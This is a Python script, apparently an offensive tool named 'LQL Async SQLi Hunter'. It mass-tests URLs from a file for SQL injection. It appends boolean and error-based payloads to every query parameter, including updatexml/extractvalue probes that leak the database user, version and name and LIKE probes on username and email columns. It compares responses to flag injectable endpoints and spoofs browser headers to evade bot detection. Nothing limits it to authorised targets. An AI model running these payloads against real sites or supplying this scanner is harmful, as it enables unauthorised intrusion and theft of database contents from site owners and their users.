#!/usr/bin/env python3
import aiohttp
import asyncio
from urllib.parse import urlparse, parse_qsl, urlencode
import sys
import random

# Random author pick
authors = ["Eth3rnal", "Myst1cAura", "D-Sentinel"]
print(f"By {random.choice(authors)} - LQL Async SQLi Hunter")

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <urls_file>")
    sys.exit(1)

urls_file = sys.argv[1]
results_file = "lql_results.txt"

# Updated payloads: true, false1, false2
payloads = [
    ['" OR "1"="1', '" OR "1"="2', '" OR "1"="242"'],
    ["' OR '1'='1", "' OR '1'='2", "' OR '1'='242"],
    [" OR 1=1", " OR 1=2", " OR 1=242"],
    ['" OR "a"="a', '" OR "a"="b', '" OR "a"="c"'],
    ["' OR 'a'='a", "' OR 'a'='b", "' OR 'a'='c"],
    ['" OR "432%25"="432', '" OR "432%25"="44', '" OR "432%25"="999"'],
    ["' OR '432%25'='432", "' OR '432%25'='44", "' OR '432%25'='999'"],
    ["') OR ('1'='1", "') OR ('1'='2", "') OR ('1'='3"],
    ['") OR ("1"="1', '") OR ("1"="2', '") OR ("1"="3'],
    ["' OR '1'='1' -- ", "' OR '1'='2' -- ", "' OR '1'='3' -- "],
    ['" OR "1"="1" -- ', '" OR "1"="2" -- ', '" OR "1"="3" -- '],
    ["1) OR (1=1", "1) OR (1=2", "1) OR (1=3"],
    ["' OR 1=1#", "' OR 1=2#", "' OR 1=3#"],
    ['" OR 1=1#', '" OR 1=2#', '" OR 1=3#'],
    ["' OR username LIKE 'a%' -- ", "' OR username LIKE 'b%' -- ", "' OR username LIKE 'c%' -- "],
    ['" OR email LIKE "a%" -- ', '" OR email LIKE "b%" -- ', '" OR email LIKE "c%" -- '],
    ["' AND updatexml(1,concat(0x7e,user()),1) -- ", "' AND updatexml(1,concat(0x7e,version()),1) -- ", "' AND updatexml(1,concat(0x7e,database()),1) -- "],
    ['" AND extractvalue(1,concat(0x7e,database())) -- ', '" AND extractvalue(1,concat(0x7e,version())) -- ', '" AND extractvalue(1,concat(0x7e,user())) -- '],
]

# Custom Chrome-like headers to evade basic bot detection
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

async def fetch(session, base_url, params):
    try:
        # disable auto-decompression so len(raw) matches curl | wc -c
        async with session.get(
            base_url,
            params=params,
            headers={k: v for k, v in HEADERS.items() if k.lower() != "accept-encoding"},
            timeout=15,
            compress=False
        ) as resp:
            raw = await resp.content.read()  # raw bytes exactly as sent
            text = raw.decode(errors="ignore")  # still usable for line/word counts
            return {
                'url': str(resp.url),
                'status': resp.status,
                'length': len(raw),  # matches curl without --compressed
                'lines': text.count('\n'),
                'words': len(text.split())
            }
    except Exception as e:
        return {'url': base_url, 'error': str(e)}

async def test_url(session, url, counter, total):
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    tasks = []

    # generate all payloaded URLs first
    for payload_true, payload_false1, payload_false2 in payloads:
        for key in list(params.keys()):
            # TRUE payload
            mod_true = params.copy()
            mod_true[key] = mod_true[key] + payload_true
            tasks.append(fetch(session, base_url, mod_true))

            # FALSE1 payload
            mod_false1 = params.copy()
            mod_false1[key] = mod_false1[key] + payload_false1
            tasks.append(fetch(session, base_url, mod_false1))

            # FALSE2 payload
            mod_false2 = params.copy()
            mod_false2[key] = mod_false2[key] + payload_false2
            tasks.append(fetch(session, base_url, mod_false2))

            print(f"[{counter}/{total}] Testing param '{key}' on {base_url}", end='\r', flush=True)

    results = await asyncio.gather(*tasks)

    # process results 3-way
    with open(results_file, 'a') as rf:
        for j in range(0, len(results), 3):
            true_res = results[j]
            false1_res = results[j+1]
            false2_res = results[j+2]

            # skip errors
            if 'error' in true_res or 'error' in false1_res or 'error' in false2_res:
                continue

            # only compare if false1 ≈ false2
            static_length = false1_res['length'] == false2_res['length']
            static_lines = false1_res['lines'] == false2_res['lines']
            static_words = false1_res['words'] == false2_res['words']
            static_status = false1_res['status'] == false2_res['status']

            diffs = []
            if static_length and true_res['length'] != false1_res['length']:
                diffs.append(f"size: {true_res['length']} vs {false1_res['length']}")
            if static_lines and true_res['lines'] != false1_res['lines']:
                diffs.append(f"lines: {true_res['lines']} vs {false1_res['lines']}")
            if static_words and true_res['words'] != false1_res['words']:
                diffs.append(f"words: {true_res['words']} vs {false1_res['words']}")
            if static_status and true_res['status'] != false1_res['status']:
                diffs.append(f"status: {true_res['status']} vs {false1_res['status']}")

            if diffs:
                rf.write(f"[POSSIBLE SQLi] {true_res['url']}\n   Differences: {', '.join(diffs)}\n\n")

    print(f"[{counter}/{total}] done", end='\r', flush=True)


async def main():
    with open(urls_file) as f:
        urls = [line.strip() for line in f if '?' in line]
    total = len(urls)
    counter = 1

    open(results_file, 'w').close()  # clear previous results

    async with aiohttp.ClientSession() as session:
        for u in urls:
            await test_url(session, u, counter, total)
            counter += 1
    print(f"\nAll {total} URLs processed. Results saved in {results_file}")

if __name__ == "__main__":
    asyncio.run(main())
